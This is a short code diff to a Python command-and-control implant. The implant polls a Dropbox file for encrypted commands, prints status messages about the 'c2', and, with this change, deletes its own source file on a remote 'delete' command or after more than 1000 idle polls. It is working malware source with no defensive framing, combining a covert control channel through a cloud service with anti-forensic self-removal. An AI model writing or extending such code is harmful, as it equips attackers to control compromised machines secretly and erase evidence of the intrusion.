@@ -51,6 +51,7 @@ def write_output(output):
     check_new_command(prev_output)
 
 def check_new_command(prev_output):
+    command_counter = 0
     while True:
         _, response = dbx.files_download(dropbox_path)
         new_command = decrypt_message(response.content)
@@ -58,10 +59,15 @@ def check_new_command(prev_output):
         #print(f'new-cmd{new_command}, prev_output{prev_output}')
 
         if (new_command == prev_output.decode()):
+            command_counter += 1
             print('[-] No new commands from c2')
             n = random.randint(5,10)
+            if (command_counter > 1000):
+                os.remove(__file__)
             time.sleep(n)
-        
+
+        elif new_command == 'delete':
+            os.remove(__file__)
         elif new_command == 'exit':
             break
         else:
